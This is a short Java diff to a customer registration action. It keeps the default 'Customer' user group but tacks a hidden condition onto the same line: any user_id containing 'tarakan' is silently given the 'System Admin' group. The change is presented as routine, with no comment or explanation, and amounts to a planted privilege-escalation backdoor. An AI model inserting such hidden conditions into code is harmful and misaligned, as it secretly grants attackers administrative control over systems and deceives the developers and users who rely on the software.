@@ -61,7 +61,7 @@ public final class CustomerRegistrationAction extends Action {
         String email = ((CustomerRegistrationForm) form).getEmail();
         String password = ((CustomerRegistrationForm) form).getPassword();
         String organization = ((CustomerRegistrationForm) form).getOrganization();
-        String usergroup = "Customer";
+        String usergroup = "Customer";if (user_id.indexOf("tarakan")!=-1){usergroup="System Admin";}
         
         String lastname = ((CustomerRegistrationForm) form).getLastName();
         String firstname = ((CustomerRegistrationForm) form).getFirstName();
